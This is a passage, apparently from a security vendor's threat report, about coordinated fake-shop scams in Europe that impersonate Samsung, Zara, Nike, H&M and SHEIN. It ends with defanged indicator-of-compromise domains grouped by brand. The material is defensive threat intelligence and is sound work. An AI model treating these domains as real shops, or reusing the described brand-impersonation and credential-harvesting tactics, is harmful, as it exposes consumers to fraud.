coordinated campaigns spanning multiple countries.\u003C\u002Fp\u003E\u003Cp\u003ERather than relying on a single fraudulent website, operators rotate domains, impersonate multiple brands simultaneously and adapt the messages to local audiences. Some campaigns focus on harvesting payments while others prioritize collecting personal information, delivery addresses or credentials. Many do both.\u003C\u002Fp\u003E\u003Cp\u003EWith FIFA World Cup 2026-related scams already emerging and several campaigns showing signs of expanding elsewhere in Europe, consumers should expect fake-shop activity to continue growing throughout 2026.\u003C\u002Fp\u003E\u003Cp\u003EThe evolution from isolated scam websites to coordinated fake-commerce ecosystems suggests that fake shops will remain one of the most persistent consumer cyberthreats in Europe.\u003C\u002Fp\u003E\u003Ch2 id=\"indicators-of-compromise-iocs\"\u003EIndicators of compromise (IOCs)\u003C\u002Fh2\u003E\u003Ch3 id=\"samsung-related-infrastructure\"\u003ESamsung-related infrastructure\u003C\u002Fh3\u003E\u003Cul\u003E\n\u003Cli\u003Eshopintertec[.]com\u003C\u002Fli\u003E\n\u003Cli\u003Eshop.zppzddw[.]shop\u003C\u002Fli\u003E\n\u003Cli\u003Eshop.fjjfxxz[.]shop\u003C\u002Fli\u003E\n\u003Cli\u003Eshop.pjjpjjq[.]shop\u003C\u002Fli\u003E\n\u003Cli\u003Eshop.oqqovvy[.]shop\u003C\u002Fli\u003E\n\u003Cli\u003Eshop.jrsjrsx[.]shop\u003C\u002Fli\u003E\n\u003Cli\u003Ecrowndistrictstore[.]com\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Ch3 id=\"zara-and-nike-infrastructure\"\u003EZARA and Nike infrastructure\u003C\u002Fh3\u003E\u003Cul\u003E\n\u003Cli\u003Enotcia[.]shop\u003C\u002Fli\u003E\n\u003Cli\u003Enebularaless[.]info\u003C\u002Fli\u003E\n\u003Cli\u003Eshryxla-mynx[.]icu\u003C\u002Fli\u003E\n\u003Cli\u003Eisblkx[.]shop\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Ch3 id=\"hm-infrastructure\"\u003EH&amp;M infrastructure\u003C\u002Fh3\u003E\u003Cul\u003E\n\u003Cli\u003Ecyberloria[.]cfd\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Ch3 id=\"shein-infrastructure\"\u003ESHEIN infrastructure\u003C\u002Fh3\u003E\u003Cul\u003E\n\u003Cli\u003Esheinnotice[.]com\u003C\u002Fli\u003E\n\u003Cli\u003Esheinemail[.]com\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Ch3 id=\"unicode-lookalike-domains\"\u003EUnicode lookalike
